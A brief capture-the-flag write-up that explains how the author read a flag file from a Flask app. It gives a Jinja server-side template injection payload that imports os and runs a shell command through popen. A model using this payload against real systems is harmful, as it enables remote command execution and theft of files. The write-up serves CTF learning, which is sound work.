This app is using jinja, a flask tool. 

A common payload for getting files in Jinja is.
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}

By doing this it printed out the flag for me
